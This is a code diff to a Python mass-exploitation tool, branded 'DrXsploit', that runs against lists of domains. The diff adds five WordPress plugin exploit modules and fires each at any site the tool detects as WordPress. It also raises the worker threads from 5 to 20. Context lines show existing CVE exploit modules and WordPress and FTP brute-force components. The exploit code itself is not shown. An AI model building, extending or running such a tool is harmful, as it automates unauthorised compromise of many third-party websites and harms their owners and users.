@@ -54,6 +54,9 @@ from exploits import Presta_wdoptionpanel
 from exploits import Presta_wg24themeadministration
 from exploits import cartabandonmentproOld
 # ------------Wordpress-------------
+from exploits import Wp_Membership_For_WooCommerce
+from exploits import Wp_22
+from exploits import Wp_Augmented_Reality
 from exploits import cherry_plugin
 from exploits import CVE_2008_3362Download_Manager
 from exploits import CVE_2014_4725wysija
@@ -67,6 +70,7 @@ from exploits import CVE_2018_19207wp_gdpr_compliance
 from exploits import CVE_2019_9879wp_graphql
 from exploits import formcraft
 from exploits import Headway
+from exploits import Wp_Seotheme
 from exploits import pagelinesExploit
 from exploits import WooCommerce_ProductAddonsExp
 from exploits import WpCateGory_page_icons
@@ -93,6 +97,7 @@ from exploits import Wp_prh_api
 from exploits import Wp_dzs_videogallery
 from exploits import Wp_mmplugin
 from exploits import wpinstall
+from exploits import Wp_background_image_cropper
 from BruteForce import Wordpress
 from BruteForce import FTPBruteForce
 # -------------Joomla---------------
@@ -187,7 +192,7 @@ def banner():
     """
     )
     console.print("\n-----------------\n", style="bold")
-    console.print("DrDos v1.0", style="bold")
+    console.print("DrXsploit v1.0", style="bold")
     console.print("By The [link https://github.com/DrDataYE]@DrDataYE", style="bold")
     console.print("Telegram [link https://t.me/LinuxArabe]Kali Linux", style="bold")
     console.print("By Yemen", style="bold")
@@ -226,6 +231,16 @@ def MultiThreadScan(site):
             pass
         Check_CMs = DetectCMS(site)
         if Check_CMs == 'wordpress':
+            i = Wp_Membership_For_WooCommerce.Exploit(site)
+            Rez(site, i)
+            i = Wp_22.Exploit(site)
+            Rez(site, i)
+            i = Wp_Seotheme.Exploit(site)
+            Rez(site, i)
+            i = Wp_Augmented_Reality.Exploit(site)
+            Rez(site, i)
+            i = Wp_background_image_cropper.Exploit(site)
+            Rez(site, i)
             i = CVE_2019_9978SocialWarfare.Exploit(site)
             Rez(site, i)
             i = cherry_plugin.Exploit(site)
@@ -521,7 +536,7 @@ if __name__ == "__main__":
         ) as status:
             # for site in domains:
             #     MultiThreadScan(site)
-            with ThreadPoolExecutor(max_workers=5) as executor:
+            with ThreadPoolExecutor(max_workers=20) as executor:
                 results = list(executor.map(MultiThreadScan, domains))
     
     except KeyboardInterrupt:
